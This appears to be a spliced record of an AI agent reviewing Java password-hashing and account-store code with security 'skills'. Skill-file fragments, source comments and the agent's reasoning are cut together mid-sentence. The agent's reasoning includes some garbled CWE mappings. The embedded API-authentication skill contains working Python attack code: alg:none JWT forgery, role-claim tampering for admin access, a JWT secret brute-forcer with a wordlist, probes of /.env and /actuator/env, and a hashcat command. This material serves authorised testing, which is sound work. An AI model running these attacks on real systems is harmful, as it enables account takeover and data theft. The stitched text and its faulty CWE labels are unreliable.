On its own it holds no vulnerability rules; its job is\nto understand the code under review, pull in the most relevant specialised\nskills from this same library, and apply them. This library contains hundreds\nof specialised skills (cryptographic audit, SQL injection, JWT verification,\nsecrets in source, deserialization, access control, and many more) whose\nindividual descriptions are often too narrow to self-trigger on a plain \"review\nthis code\" request. This skill is the entry point that finds and uses them.\n\n## When to Use\n\n- Any request to review, audit, or security-check source code\n- Any request to find vulnerabilities or check code against OWASP Top 10 / CWE\n- As the first step before the library's specialised application-security skills\n\n## Workflow\n\n### Step 1 - Understand the code\nRead every source file in scope. For each file, note in one or two lines what it\ndoes, and flag every security-relevant behaviour, e.g.:\n- SQL / database query construction (string building vs parameterised)\n- Cryptography: hashing, encryption, cipher mode, key/IV/salt handling, RNG\n- Authentication, sessions, password storage, tokens / JWT\n- Input handling, deserialization, file/path access, OS command execution\n- Network calls, TLS settings, secrets / credentials in source\nTurn these into a short list of keywords (e.g. \"sql injection\", \"cryptography\",\n\"jwt\", \"hardcoded secret\", \"deserialization\", \"xss\").\n\n### Step 2 - Find applicable skills (cheaply)\nThe other skills in this library are the sibling directories next to this\nskill's own directory. Do NOT read them all. Instead:\n1. Find this skill's directory, then its parent (the library root).\n2. Grep skill NAMES first for your Step 1 keywords, e.g. from the library root:\n   `ls | grep -iE 'crypto|sql|jwt|secret|deserial|xss|auth|password'`\n3. For the closest name matches, read ONLY the `description` frontmatter of\n   their SKILL.md (`sed -n '1,15p' <name>/SKILL.md`).\n\nSelect EVERY skill whose description clearly matches a security-relevant\nbehaviour you found in Step 1 - one or more per behaviour. Do NOT cap the count\nartificially: code that touches several concerns should match several skills,\nand that is expected. Order the selected skills by likely severity / relevance\nso the most important are handled first.\n\n### Step 3 - Apply each selected skill\nWork through the selected skills in priority order. Read each skill's body (and\nits `references/` files if present) only when you reach it - one at a time, not\nall up front - so that a long list of matches never exhausts context. Apply each\nskill's weakness table / checklist / verification criteria against the actual\ncode from Step 1, citing concrete `file:line` evidence for every check that\nfires. Some skills ship Python helper scripts - apply their *knowledge* to\nwhatever language the code is in; do not run their scripts against non-Python\ncode.\n\n### Step 4 - Report\nProduce a findings report:\n- One entry per issue: severity, CWE id, `file:line`, why it is a problem, and\n  the fix.\n- A \"Skills applied\" list naming the specialised skills you used.\n- For any security-relevant behaviour that had no matching library skill, review\n  it against general OWASP Top 10 / CWE knowledge and say you did so.\n- If nothing is wrong, say so explicitly and list what you checked.\n\n## Constraints\n\n- Report only. Do not create or modify any files unless explicitly asked.\n- Keep the library search cheap: grep names, skim descriptions, and fully read\n  skill bodies only as you apply them, one at a time. Recovery is\n * impossible by design; only a guess-and-check attack against this specific salt is left,\n * which is exactly what the iteration count is there to slow down.\n *\n * <p>Passwords are accepted as {@code char[]} rather than {@code String} so that callers can\n * erase their own copy of the secret; {@link PBEKeySpec} is always cleared before this class\n * returns.\n */\npublic final class PasswordHasher {\n\n    public static final String ALGORITHM = \"PBKDF2WithHmacSHA256\";\n\n    /**\n     * OWASP's current minimum for PBKDF2-HMAC-SHA256. I've now finished reading all 6 source files. Let me summarize what each file does and flag the security-related behaviors.\n\n**Step 1 — Understanding the code:**\n\n1. **Account.java** — A Java `record` that represents an account: username, passwordHash (a non-reversible verifier), createdAt. Validates username against `[a-z0-9._-]{3,32}`, case-insensitive normalization via `canonicalUsername` (trim + Locale.ROOT toLowerCase). `toString()` masks (redacts) the password hash. No plaintext password field.\n\n2. **PasswordHasher.java** — PBKDF2WithHmacSHA256 password hashing:\n   - SecureRandom salt (16 bytes), 32-byte key, default 310,000 iterations (OWASP's minimum for PBKDF2-HMAC-SHA256).\n   - PHC-format record: `$PBKDF2WithHmacSHA256$i=<iters>$l=<keyBits>$s=<b64>$h=<b64>$`\n   - Constant-time comparison via `MessageDigest.isEqual`.\n   - `PBEKeySpec.clearPassword()` in finally.\n   - `derive()` creates a `PBEKeySpec` from `char[]` — note: `PBEKeySpec(char[] password, byte[] salt, int iterationCount, int keyLength)` — this spec internally converts the char[] to a String (the PBEKeySpec constructor does `new String(password)`)… in fact, javax's PBEKeySpec constructor stores the char array and converts it to a String when the password is needed; `clearPassword()` erases the char array. The conversion `char[] -> String` happens inside `engineGenerateSecret` in the SunJCE provider. This is a minor issue: the password ends up temporarily held in an immutable String within the provider — but this is inherent to using PBEKeySpec with javax.crypto, and it's standard practice. Not a major finding.\n   - `matches()` decodes, derives with the stored parameters, and does constant-time comparison.\n   - `burnTime()` — a dummy derivation to equalize timing for unknown users.\n   - Decode validation: algorithm is pinned (doesn't allow the file to pick a cheaper primitive), iteration count range [1000, 5,000,000], salt length 16..64, keyBits matches hash length, hash length 16..64.\n   - `needsUpgrade` flags weaker parameters.\n\n   Potential issues to scrutinize:\n   - Salt 16 bytes = 128 bits. OWASP recommends a minimum of 16 bytes for PBKDF2 — fine.\n   - Default 310,000 iterations for PBKDF2-HMAC-SHA256 matches OWASP's 2023+ recommendation (OWASP's PBKDF2-SHA256 minimum is currently 600,000? Let me think: OWASP Password Storage Cheat Sheet: PBKDF2-HMAC-SHA512 210,000 iterations; PBKDF2-HMAC-SHA256 600,000 iterations (updated November 2023). Before that, SHA256 was 390,000, and even earlier 310,000. So 310,000 is the older OWASP recommendation (2020). By current OWASP (2023 onward) SHA256 minimum is 600k. This is worth noting as a \"below current OWASP minimum\" observation — severity: low/informational. The code comment says \"OWASP's current minimum\" — slightly outdated. I could flag it as low severity.\n   - `matches()` with empty password returns false before derivation… but the service handles empty password by throwing an exception before reaching matches. No problem.\n   - Timing: `burnTime` uses a random salt each time — no issue.\n   - `decode()` uses `encoded.substring(1, encoded.length()-1).split(\"\\\\$\")` after counting exactly 6 separators. If the string has exactly 6 `$` and starts/ends with `$`, parts.length should be 5. OK.\n   - `field()` checks prefix. `parsePositiveInt` validates digits. No overflow: \"99999999999999\" (14 digits) — `raw.chars().allMatch` passes for digits, and `Integer.parseInt` throws NumberFormatException, which is caught and re-thrown as IAE. No issue.\n   - DoS: iteration count capped at 5 million — OK. Password length capped at 1024 — OK.\n   - One subtle point: `derive` is called from `burnTime` with `iterations` from the hasher — no issue.\n   - `needsUpgrade` uses `stored.iterations < iterations` — if a record has more iterations than the policy, it's not flagged as an upgrade. No issue.\n\n3. **AccountStore.java** — A file-based store, one account per line, key=value format:\n   - `loadAll()`: NOFOLLOW_LINKS checks (existence, is-directory), reads all bytes, strict parsing, rejects duplicates, rejects unknown fields, validates username, parses Instant, validates stored hash via hasher.validateStoredHash (rejects unsupported/corrupt records).\n   - `saveAll()`: writes to a temp file in the same directory, restricts to owner 600, fsync, moves with REPLACE_EXISTING, then restricts the final file, deletes temp in finally.\n   - `lock()`: advisory FileLock on a separate `.lock` file — guards against concurrent writers from multiple processes.\n   - `sweepTempFiles()`: best-effort cleanup of stray temp files.\n   - `restrictToOwner`: POSIX 600 permissions; on failure, throws IllegalStateException (except on non-POSIX).\n\n   Potential issues:\n   - **TOCTOU on file permissions**: `Files.readAllBytes(file)` — the file permissions are set to 600 on write, but nothing verifies on read that the file is owner-only before reading it. If an attacker can replace the file (on the same filesystem, an attacker in the same user group or with write access to the directory… actually, the parent directory's permissions are not restricted!), the attacker could swap the store with their own. But that requires write access to the parent directory, which is an operational issue.\n   - **TOCTOU in saveAll**: `Files.createTempFile(parent, ...)` then `restrictToOwner(temp)` — between creation and chmod, the temp file has the default umask permissions (typically 644), briefly readable by others. The file contains a password verifier (not a plaintext password), but the verifier file is sensitive. Brief 644 window = TOCTOU (CWE-367/362). Severity: low/medium.\n   - Also, `Files.move(temp, file, REPLACE_EXISTING)` — if `file` already exists with different ownership, does the move fail, or does it replace? On POSIX, rename(2) replaces regardless of target permissions. No issue.\n   - **Symlink attack on `file` itself**: loadAll uses NOFOLLOW_LINKS on the exists check, but `Files.readAllBytes(file)` follows symlinks. If an attacker can create a symlink at the store path pointing to another file (e.g., /etc/shadow or a different user's file), readAllBytes follows the link and reads the target. The NOFOLLOW_LINKS check catches the case where the path itself is a symlink! `Files.exists(file, LinkOption.NOFOLLOW_LINKS)` returns false for a broken symlink; `Files.isDirectory(file, NOFOLLOW_LINKS)` is false for a symlink to a directory. Then `Files.readAllBytes` follows the symlink → TOCTOU (CWE-367: Excessive Permission… more precisely, this is symlink-following TOCTOU, CWE-362/369 or CWE-20?). This is a local attack and requires the attacker to have write access to the store's directory (to create the symlink). The store path defaults to `~/.secure-accounts/store` — the attacker needs to be able to write in `~/.secure-accounts`. In the case of a shared host/multi-user scenario, this is a real (albeit low-severity) local vector. Worth mentioning as an observation (CWE-367 TOCTOU / symlink following).\n   - Similarly, the lock file is created with CREATE — if an existing `.lock` is a symlink, the lock could be taken on the target file.\n   - **`loadAll` when the file doesn't exist returns an empty map** — combined with `register` writing via `saveAll`, no issue.\n   - The store file stores verifiers, not passwords. Permissions 600 on POSIX. On non-POSIX, there's no restriction — noted in the comment.\n\n4. **AccountService.java** — Registration/authentication:\n   - `register`: normalizes username, checks password length (non-empty, ≤ 1024), under lock: duplicate check, hash, save.\n   - `authenticate`: normalizes (if invalid, burns time + throws), fetches account (if null, burns time + throws), empty password check, matches, transparent upgrade.\n   - Uniform error message `BAD_CREDENTIALS` for unknown user/wrong password — good, prevents account enumeration.\n   - Timing equalization via `burnTime(dummySecret())` — good.\n   - `exists()` — \"intentionally not reachable from authenticate: this is for the CLI's own preflight check.\" **This is account enumeration!** The CLI's `register` calls `service.exists(username)` and prints \"username 'X' is already registered\" — a preflight check that leaks account existence. However, note that register is an action the user takes themselves; the `list` command lists all usernames (but that's the CLI for a local file, intended as an admin tool). Since this is a CLI for a local personal store, \"enumeration\" is less serious than in a web context. But the comment says exists is for \"the CLI's own preflight check\" — and `register` prints the canonicalized username of the existing account in the error: `username 'alice' is already registered` — revealing the normalized name. Given it's a local CLI, low severity. Could be mentioned as a note (CWE-204: Observable Response Discrepancy) with a note that the impact is limited in this local CLI context. Actually — the error message in Main.register prints the existing username… the caller typed the username themselves, so they already know it. The preflight in register just improves UX (avoiding reading the password for a name that's already registered). For a local CLI, I'd rate this as informational/low.\n   - `listAccounts()` — lists usernames + createdAt. This is for a local admin CLI. No issue.\n   - Upgrade path: after successful authentication, rehashes with new parameters under the lock. No issue.\n\n   One subtle issue in `authenticate`: if `password == null || length == 0`, it throws AuthenticationFailedException *before* derivation — for a known user with an empty password, this path is cheap (no derivation), whereas an unknown user incurs the cost of burnTime. Timing difference: known user + empty password = fast rejection; unknown user = slow (burn). This lets an attacker distinguish \"the account exists but the password is empty/absent\" from \"the account does not exist.\" Minor timing oracle — low severity. Actually, the service checks `password == null || password.length == 0` → immediately throws. Meanwhile, `hasher.matches` also returns false early for empty password (though the service throws before that). So for a known user with an empty password input: no KDF is run at all → fast. For an unknown user: burnTime runs → slow. So timing distinguishes the two: fast rejection = known user (empty password); slow rejection = unknown user. That's an account enumeration timing oracle! Wait — what about a known user with a non-empty password? Derivation runs (slow). Unknown user: burnTime (slow). Known user + empty password: fast. So an attacker who sends an empty password can distinguish existing vs. non-existing accounts by timing. This is a genuine (if subtle) finding — low severity, CWE-208 (Observable Timing Discrepancy). The design intends to equalize unknown user vs. wrong password, but empty password for a known user skips derivation. Worth reporting as low.\n\n   Hmm, but is this in scope? Yes, it's a code security review, and I should report it as low/informational.\n\n5. **Main.java** — CLI:\n   - Password is read via Console.readPassword (echo off) or stdin pipe. Not from arguments. that involve performing cryptographic audit of application\n- When following incident response procedures for related security events\n- When performing scheduled security testing or auditing activities\n- When validating security controls through hands-on testing\n\n## Prerequisites\n\n- Familiarity with cryptography concepts and tools\n- Access to a test or lab environment for safe RC4)\n- Identify insecure cipher modes (ECB) and padding schemes\n- Find hardcoded keys, passwords, and secrets in source code\n- Verify TLS/SSL configuration strength\n- Check key derivation function parameters\n- Validate random number generator usage\n- Produce a structured audit report with findings and remediation\n\n## Key Concepts\n\n### Cryptographic Weakness Categories\n\n| Category | Examples | Risk Level |\n|----------|----------|------------|\n| Weak Hashing | MD5, SHA-1 for integrity/signatures | High |\n| Insecure Encryption | DES, 3DES, RC4, Blowfish | High |\n| Bad Cipher Mode | ECB mode for any block cipher | High |\n| Insufficient Key Size | RSA < 2048, AES-128 for long-term | Medium |\n| Hardcoded Secrets | Keys/passwords in source code | Critical |\n| Weak KDF | Low iteration PBKDF2, plain MD5 | High |\n| Poor Entropy | time-based seeds, predictable IVs | High |\n| Deprecated Protocols | SSLv3, TLS 1.0, TLS 1.1 | High |\n\n## Security Considerations\n\n- items from the crypto audit skill (applied to this Java code):\n\n1. **Use of deprecated algorithms (MD5, SHA-1, DES, RC4)** — PasswordHasher uses only `PBKDF2WithHmacSHA256`. The only use of `MessageDigest` is `MessageDigest.isEqual` (constant-time comparison, not a security-critical hash). No deprecated algorithms. ✅ No issue.\n\n2. **Insecure cipher modes (ECB)** — No symmetric encryption used at all (one-way KDF only). ✅ N/A.\n\n3. **Hardcoded keys/passwords/secrets** — `AccountService.dummySecret()` = `\"timing-equaliser-not-a-secret-0123456789\"` — a hardcoded string. OWASP Password Storage Cheat Sheet: PBKDF2-HMAC-SHA256 minimum = 600,000 (November 2023 update; before that it was 390,000 / 310,000). As of 2026, 310k falls below the current OWASP minimum. The code's comment calls this \"OWASP's current minimum\" — that's outdated. → **Finding (low)**: CWE-916 (insufficient computation in resource allocation) or CWE-757 (selection of weaker hashing algorithm than required) / CWE-328 (reversible one-way hash — no). The appropriate CWE for weak KDF parameters is **CWE-916: Insufficient Computational Effort** (OWASP maps password hash iteration count to CWE-916) — yes, CWE-916 fits best.\n   - The floor `MIN_ACCEPTED_ITERATIONS = 1_000` and the CLI `--iterations` flag permit writing a verifier at 1,000 iterations — 300× weaker than the production default; a 1k-iteration PBKDF2-SHA256 can be cracked at high speed offline (billions per second on GPU). → **Finding (low)**: CWE-757/CWE-916 — user-controllable KDF strength; recommend enforcing the production minimum for writes (or at least a warning).\n   - Salt: 16 bytes from `SecureRandom` — CSPRNG ✅, 128-bit salt is fine (OWASP requires ≥128 bits… OWASP states the salt should be at least 16 bytes for PBKDF2 — ✅).\n   - Key length: 32 bytes / 256 bits ✅.\n   - The `l=` field is validated against the actual hash length; the algorithm is fixed in decode; iteration count is capped at 5M (DoS prevention) ✅.\n\n6. **Validating RNG usage** — `SecureRandom` (CSPRNG) for the salt ✅.\n\n7. **Key storage and rotation** — Verifier storage is one-way ✅; transparent rehashing at login = a rotation mechanism ✅. The `char[]` password is cleared via `spec.clearPassword()` ✅; derived key bytes are zeroized ✅. Caveat: `PBEKeySpec`'s provider implementation internally copies the char[] to an immutable String/byte[] (SunJCE's PBKDF2Core runs `new String(password)`) — that copy cannot be zeroized and persists until GC. This is inherent to the javax.crypto API. → **Informational**: CWE-214 (obfuscation… no) — CWE-244 (insecure storage of sensitive information) / more precisely **CWE-256**? Use **CWE-214: Information Exposure Through Critically Version-Dependent Information**? No. The right CWE: **CWE-244: Insecure Storage of Sensitive Information** or **CWE-522: Insufficiently Protected Credentials**. Report as an informational note under CWE-522, noting the standard mitigation is already implemented (spec cleared, caller buffer zeroized) and the residual copy is inherent to PBEKeySpec.\n\n8. **Constant-time comparison** — `MessageDigest.isEqual` ✅.\n\n9. **Timing equalization** — `burnTime` for unknown users ✅ (see the auth skill for gaps in the empty-password case).\n\nAlso `AccountStore` — no crypto other than validating the hasher's records.\n\nNext skill: `testing-api-authentication-weaknesses`. Authentication testing involves attempting to bypass security controls.\n\n## Prerequisites\n\n- Written authorization specifying target API and authentication mechanisms in scope\n- Valid test credentials for at least two user roles (regular user, admin)\n- Burp Suite Professional with JWT-related extensions (JSON Web Tokens, JWT Editor)\n- Python 3.10+ with `requests`, `PyJWT`, and `jwt` \"jwt_bearer\": False,\n    \"api_key_header\": False,\n    \"api_key_query\": False,\n    \"basic_auth\": False,\n    \"oauth2\": False,\n    \"session_cookie\": False,\n    \"custom_token\": False,\n}\n\n# Test 1: Check unauthenticated access\nresp = requests.get(f\"{BASE_URL}/users/me\")\nprint(f\"Unauthenticated: {resp.status_code}\")\nif resp.status_code == 200:\n    print(\"[CRITICAL] Endpoint accessible without authentication\")\n\n# Test 2: Check WWW-Authenticate header\nif \"WWW-Authenticate\" in resp.headers:\n    scheme = resp.headers[\"WWW-Authenticate\"]\n    print(f\"Auth scheme advertised: {scheme}\")\n    if \"Bearer\" in scheme:\n        auth_indicators[\"jwt_bearer\"] = True\n    elif \"Basic\" in scheme:\n        auth_indicators[\"basic_auth\"] = True\n\n# Test 3: Login and examine tokens\nlogin_resp = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": \"testuser@example.com\", \"password\": \"TestPass123!\"})\n\nif login_resp.status_code == 200:\n    login_data = login_resp.json()\n    # Check for JWT tokens\n    for key in [\"token\", \"access_token\", \"jwt\", \"id_token\"]:\n        if key in login_data:\n            token = login_data[key]\n            if token.count('.') == 2:\n                auth_indicators[\"jwt_bearer\"] = True\n                print(f\"JWT found in response field: {key}\")\n    # Check for refresh tokens\n    for key in [\"refresh_token\", \"refresh\"]:\n        if key in login_data:\n            print(f\"Refresh token found in field: {key}\")\n    # Check for session cookies\n    for cookie in login_resp.cookies:\n        print(f\"Cookie set: {cookie.name} = {cookie.value[:20]}...\")\n        if \"session\" in cookie.name.lower():\n            auth_indicators[\"session_cookie\"] = True\n\nprint(f\"\\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}\")\n```\n\n### Step 2: Unauthenticated Endpoint Discovery\n\n```python\n# Test all endpoints without authentication\nendpoints = [\n    (\"GET\", \"/users\"),\n    (\"GET\", \"/users/me\"),\n    (\"GET\", \"/users/1\"),\n    (\"GET\", \"/admin/users\"),\n    (\"GET\", \"/admin/settings\"),\n    (\"GET\", \"/health\"),\n    (\"GET\", \"/metrics\"),\n    (\"GET\", \"/debug\"),\n    (\"GET\", \"/actuator\"),\n    (\"GET\", \"/actuator/env\"),\n    (\"GET\", \"/swagger.json\"),\n    (\"GET\", \"/api-docs\"),\n    (\"GET\", \"/graphql\"),\n    (\"POST\", \"/graphql\"),\n    (\"GET\", \"/config\"),\n    (\"GET\", \"/internal/status\"),\n    (\"GET\", \"/.env\"),\n    (\"GET\", \"/status\"),\n    (\"GET\", \"/info\"),\n    (\"GET\", \"/version\"),\n]\n\nprint(\"Unauthenticated Endpoint Scan:\")\nfor method, path in endpoints:\n    try:\n        resp = requests.request(method, f\"{BASE_URL}{path}\", timeout=5)\n        if resp.status_code not in (401, 403):\n            content_preview = resp.text[:100] if resp.text else \"empty\"\n            print(f\"  [OPEN] {method} {path} -> {resp.status_code}: {content_preview}\")\n    except requests.exceptions.RequestException:\n        pass\n```\n\n### Step 3: JWT Token Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = login_data.get(\"access_token\", \"\")\nheader, payload = decode_jwt_parts(token)\n\nprint(f\"JWT Header: {json.dumps(header, indent=2)}\")\nprint(f\"JWT Payload: {json.dumps(payload, indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: {missing}\")\n\n# Check 5: Key ID\nif \"kid\" in header:\n    kid = header[\"kid\"]\n    # Test for path traversal in kid\n    issues.append(f\"INFO: Key ID (kid) present: {kid} - test for injection\")\n\nfor issue in issues:\n    print(f\"  [{issue.split(':')[0]}] {issue}\")\n```\n\n### Step 4: JWT Manipulation Attacks\n\n```python\n# Attack 1: Remove signature (alg: none)\ndef forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n        f\"{new_header}.{parts[1]}.\",\n        f\"{new_header}.{parts[1]}.{parts[2]}\",\n        f\"{new_header}.{parts[1]}.e30\",\n    ]\n\n# Attack 2: Modify claims without re-signing\ndef forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n    payload_data.update(modifications)\n    new_payload = base64.urlsafe_b64encode(\n        json.dumps(payload_data).encode()).decode().rstrip('=')\n    return f\"{parts[0]}.{new_payload}.{parts[2]}\"\n\n# Attack 3: Brute force weak HMAC secrets\nCOMMON_JWT_SECRETS = [\n    \"secret\", \"password\", \"123456\", \"jwt_secret\", \"supersecret\",\n    \"key\", \"test\", \"admin\", \"changeme\", \"default\",\n    \"your-256-bit-secret\", \"my-secret-key\", \"jwt-secret\",\n    \"s3cr3t\", \"secret123\", \"mysecretkey\", \"apisecret\",\n]\n\ndef brute_force_jwt_secret(token):\n    \"\"\"Try common secrets against HMAC-signed JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n            return secret\n\n    print(\"No common secrets matched - consider using hashcat/john for extended brute force\")\n    return None\n\n# Test all attacks\nnone_tokens = forge_none_algorithm(token)\nfor none_token in none_tokens:\n    resp = requests.get(f\"{BASE_URL}/users/me\",\n                       headers={\"Authorization\": f\"Bearer {none_token}\"})\n    if resp.status_code == 200:\n        print(f\"[CRITICAL] alg:none bypass successful\")\n\n# Test privilege escalation via claim modification\nadmin_token = forge_payload(token, {\"role\": \"admin\", \"is_admin\": True})\nresp = requests.get(f\"{BASE_URL}/admin/users\",\n                   headers={\"Authorization\": f\"Bearer {admin_token}\"})\nif resp.status_code == 200:\n    print(\"[CRITICAL] JWT claim modification accepted without signature validation\")\n\nbrute_force_jwt_secret(token)\n```\n\n### Step 5: Token Lifecycle Testing\n\n```python\n# Test 1: Token reuse after logout\nlogout_resp = requests.post(f\"{BASE_URL}/auth/logout\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nprint(f\"Logout: {logout_resp.status_code}\")\n\n# Try to use the token after logout\npost_logout_resp = requests.get(f\"{BASE_URL}/users/me\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nif post_logout_resp.status_code == 200:\n    print(\"[HIGH] Token still valid after logout - no server-side revocation\")\n\n# Test 2: Token reuse after password change\n# (requires changing password and then testing old token)\n\n# Test 3: Refresh token rotation\nrefresh_token = login_data.get(\"refresh_token\")\nif refresh_token:\n    # Use refresh token\n    refresh_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    new_tokens = refresh_resp.json()\n\n    # Try to reuse the same refresh token (should fail if rotation is implemented)\n    reuse_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    if reuse_resp.status_code == 200:\n        print(\"[HIGH] Refresh token reuse allowed - no rotation implemented\")\n\n# Test 4: Token in URL (leakage risk)\nresp = requests.get(f\"{BASE_URL}/users/me?token={token}\")\nif resp.status_code == 200:\n    print(\"[MEDIUM] Token accepted in query parameter - may leak in logs/referrer\")\n```\n\n### Step 6: Password Policy and Credential Testing\n\n```python\n# Test password policy enforcement on registration/change endpoints\nweak_passwords = [\n    \"a\",           # Too short\n    \"password\",    # Common password\n    \"12345678\",    # Numeric only\n    \"abcdefgh\",    # Alpha only, no complexity\n    \"Password1\",   # Meets basic complexity but is common\n    \"\",            # Empty\n    \" \",           # Whitespace\n]\n\nfor pwd in weak_passwords:\n    resp = requests.post(f\"{BASE_URL}/auth/register\",\n        json={\"email\": f\"test_{hash(pwd)%9999}@example.com\",\n              \"password\": pwd, \"name\": \"Test User\"})\n    if resp.status_code in (200, 201):\n        print(f\"[WEAK POLICY] Password accepted: '{pwd}'\")\n\n# Test account enumeration via login response differences\nvalid_email = \"testuser@example.com\"\ninvalid_email = \"nonexistent_user_xyz@example.com\"\n\nresp_valid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": valid_email, \"password\": \"wrongpassword\"})\nresp_invalid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": invalid_email, \"password\": \"wrongpassword\"})\n\nif resp_valid.text != resp_invalid.text or resp_valid.status_code != resp_invalid.status_code:\n    print(f\"[MEDIUM] Account enumeration possible:\")\n    print(f\"  Valid user: {resp_valid.status_code} - {resp_valid.text[:100]}\")\n    print(f\"  Invalid user: {resp_invalid.status_code} - {resp_invalid.text[:100]}\")\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Broken Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). An attacker who discovers this secret can\nforge tokens for any user with any role, including admin. Additionally,\ntokens are not revocable - logout does not invalidate the token server-side,\nand the 7-day expiration means stolen tokens remain valid for extended periods.\n\n**Attack Chain**:\n1. Capture any valid JWT from authenticated session\n2. Brute force the HMAC secret using hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt\n3. Secret recovered in 3 minutes: \"company-jwt-secret-2023\"\n4. Forge admin JWT: modify \"role\" claim to \"admin\", re-sign with discovered secret\n5. Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts\n\n**Remediation**:\n1. Replace HS256 with RS256 using a 2048-bit RSA key pair\n2. Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. Reduce token TTL to 15 minutes with 